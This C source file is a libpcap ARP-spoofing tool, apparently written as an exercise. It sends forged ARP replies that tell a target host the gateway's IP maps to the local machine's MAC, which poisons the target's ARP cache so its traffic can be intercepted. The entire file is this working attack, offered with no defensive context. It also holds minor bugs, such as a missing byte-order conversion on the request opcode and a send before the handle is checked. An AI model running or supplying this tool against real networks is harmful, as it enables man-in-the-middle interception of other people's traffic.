#define _BSD_SOURCE
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <string.h>
#include <linux/posix_types.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

#define ETH_HDRLEN 14
#define ARP_HDRLEN 28
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2
#define TYPE_ETH 1
#define IPv4 0x0800
#define HDR_SZ 6
#define PRT_SZ 4
#define BUFSIZE 8192

struct arp_header
{
   uint16_t ar_hrd;
   uint16_t ar_pro;
   uint8_t ar_hln;
   uint8_t ar_pln;
   uint16_t ar_op;

   uint8_t arp_sha[6];
   uint32_t arp_spa;
   uint8_t arp_tha[6];
   uint32_t arp_tpa;
};

u_char Rframe[ETH_HDRLEN+ARP_HDRLEN+10];
u_char frame[ETH_HDRLEN+ARP_HDRLEN+10];

struct arp_header *arpR = (struct arp_header *)(Rframe+14);
struct arp_header *arpF = (struct arp_header *)(frame+14);

pcap_t* handle;

void Make_Header(void * data);
static int GetMacAddress(char *pIface);
void GetIpAddress(char *dev);
char *gateway;
char *targetip;
char cMacAddr[8];
char ip_addr[20];

int main(int argc, char* argv[])
{
   struct pcap_pkthdr* header;
    const u_char* packet;
   char *dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   GetMacAddress(dev); //get mac address
   GetIpAddress(dev); // get ip address
   targetip = argv[2]; // store target ip
   gateway = argv[3]; //store gateway ip
   bzero( (void *)&cMacAddr[0], sizeof(cMacAddr) );
   if ( !GetMacAddress(dev) )
   {
	printf( "Fatal error: Failed to get local host's MAC address\n" );
   }
   //test
   printf("ip address : %s\n",ip_addr);
   printf("target ip : %s\n",targetip); 
   printf("mac address : %s\n",cMacAddr);
   printf("gateway : %s\n",gateway);

   //make ARP Request Packet
   memcpy(Rframe,"\xFF\xFF\xFF\xFF\xFF\xFF",6); //input DEST mac
   memcpy(Rframe+6,cMacAddr,6); //input SRC mac
   memcpy(Rframe+12, "\x08", 1);
   memcpy(Rframe+13, "\x06", 1);
   arpR->ar_hrd = htons(TYPE_ETH);
   arpR->ar_pro = htons(IPv4);
   arpR->ar_hln = HDR_SZ;
   arpR->ar_pln = PRT_SZ;
   arpR->ar_op = ARPOP_REQUEST;
   memcpy(arpR->arp_sha, cMacAddr,6);
   inet_pton(AF_INET,ip_addr,&arpR->arp_spa);
   memcpy(arpR->arp_tha,"\x00\x00\x00\x00\x00\x00",6);
   inet_pton(AF_INET,targetip,&arpR->arp_tpa);   
   
   //test
   printf("[DEBUG] ");
   for (int i=0; i<42; i++)
         printf("%02x ",Rframe[i]);
   printf("\n");


   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   pcap_sendpacket(handle,Rframe,sizeof(Rframe)); //send request packet
   if (handle == NULL)
   {
	fprintf(stderr, "couldn't open device %s: %s\n",dev,errbuf);
   }
   while(1)
   {
   int res = pcap_next_ex(handle, &header, &packet);
   if (res == 0) continue;
   if (res == -1 || res == -2) break;
   struct ether_header* ehPs = (struct ether_header *)(void *)packet;
   if(ntohs(ehPs->ether_type) == ETHERTYPE_ARP)
     Make_Header((void *) packet);
   } 
   return 0;
}

void Make_Header(void * data)
{
  struct ether_header* ehPS = (struct ether_header *)data;
  struct arp_header* arpS = (struct arp_header *)(sizeof(struct ether_header)+data);
  
  //Make ARP Reply Packet
  memcpy(frame,ehPS->ether_shost,6); //input DEST mac
  memcpy(frame+6,cMacAddr,6); //input SRC mac
  memcpy(frame+12, "\x08", 1);
  memcpy(frame+13, "\x06", 1);

  arpF->ar_hrd = htons(TYPE_ETH);
  arpF->ar_pro = htons(IPv4);
  arpF->ar_hln = HDR_SZ;
  arpF->ar_pln = PRT_SZ;
  arpF->ar_op = htons(ARPOP_REPLY);
  
  memcpy(arpF->arp_tha,arpS->arp_sha,6);
  memcpy(arpF->arp_sha,(void *)cMacAddr,6);

  inet_pton(AF_INET,gateway,&arpF->arp_spa); //set sender ip gateway
  inet_pton(AF_INET,targetip,&arpF->arp_tpa); // set target ip
  
  //test
  printf("[DEBUG] ");
  for (int i=0; i<42; i++)
        printf("%02x ",frame[i]);
  printf("\n");
  if(pcap_sendpacket(handle,frame, sizeof(frame))!=0)
  {
    printf("False\n");
    exit(0);
  }
  else
  {
    printf("Success!\n");
  }
}

static int GetMacAddress(char *pIface)
{
int nSD; // Socket descriptor
struct ifreq sIfReq; // Interface request
struct if_nameindex *pIfList; // Ptr to interface name index
struct if_nameindex *pListSave; // Ptr to interface name index

pIfList = (struct if_nameindex *)NULL;
pListSave = (struct if_nameindex *)NULL;
#ifndef SIOCGIFADDR
return( 0 );
#endif

nSD = socket( PF_INET, SOCK_STREAM, 0 );
if ( nSD < 0 )
{
printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
return( 0 );
}

pIfList = pListSave = if_nameindex();

for ( pIfList; *(char *)pIfList != 0; pIfList++ )
{
if ( strcmp(pIfList->if_name, pIface) )
continue;
strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );

if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
{
printf( "File %s: line %d: Ioctl failed\n", __FILE__, __LINE__ );
return( 0 );
}
memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
break;
}

if_freenameindex( pListSave );
close( nSD );
return( 1 );
}



void GetIpAddress(char *dev)
{
   struct ifreq ifr;
   char ipstr[20];
   int s;
   s = socket(AF_INET, SOCK_DGRAM, 0);
   strncpy(ifr.ifr_name, dev, IFNAMSIZ);

   if (ioctl(s, SIOCGIFADDR, &ifr) < 0) 
   {
	printf("Error");
   }
   else
   {
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
	memcpy(ip_addr,ipstr,14);
   }
}
